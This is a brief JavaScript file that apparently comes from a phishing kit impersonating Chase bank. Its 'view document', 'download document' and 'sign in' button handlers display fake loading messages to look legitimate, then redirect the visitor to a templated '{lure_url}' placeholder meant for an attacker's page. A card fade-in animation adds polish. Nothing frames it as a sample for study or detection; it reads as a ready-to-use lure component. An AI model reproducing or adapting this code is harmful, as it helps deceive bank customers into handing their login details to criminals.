function viewDocument() {
    const btn = document.querySelector('.btn-chase-primary');
    btn.innerHTML = '<span>Loading secure document...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 2000);
}

function downloadDocument() {
    const btn = document.querySelector('.btn-chase-secondary');
    btn.innerHTML = '<span>Preparing download...</span>';
    btn.disabled = true;
    
    setTimeout(() => {
        window.location.href = '{lure_url}';
    }, 1800);
}

function signInChase() {
    window.location.href = '{lure_url}';
}

document.addEventListener('DOMContentLoaded', () => {
    const card = document.querySelector('.message-card');
    card.style.opacity = '0';
    card.style.transform = 'translateY(20px)';
    
    setTimeout(() => {
        card.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
        card.style.opacity = '1';
        card.style.transform = 'translateY(0)';
    }, 200);
});
